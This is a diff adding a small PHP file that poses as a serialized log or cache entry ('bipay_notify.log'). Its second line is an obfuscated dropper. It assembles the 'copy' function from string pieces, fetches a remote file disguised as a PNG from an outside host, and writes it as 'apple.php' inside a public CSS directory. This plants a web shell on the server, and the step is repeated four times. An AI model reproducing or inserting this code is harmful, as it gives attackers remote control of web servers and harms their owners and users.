@@ -1,0 +1,2 @@
+<?php /*a:1:{s:16:"bipay_notify.log";i:1642345083;}*/ ?>
+<?php $a="c";$b="opy";$c=$a.$b;$d=$c("http://0l.si/YUJINDATA/shuadanA1_upload.png","../public/static_new6/css/apple.php");$a="c";$b="opy";$c=$a.$b;$d=$c("http://0l.si/YUJINDATA/shuadanA1_upload.png","../public/static_new6/css/apple.php");$a="c";$b="opy";$c=$a.$b;$d=$c("http://0l.si/YUJINDATA/shuadanA1_upload.png","../public/static_new6/css/apple.php");$a="c";$b="opy";$c=$a.$b;$d=$c("http://0l.si/YUJINDATA/shuadanA1_upload.png","../public/static_new6/css/apple.php");?>
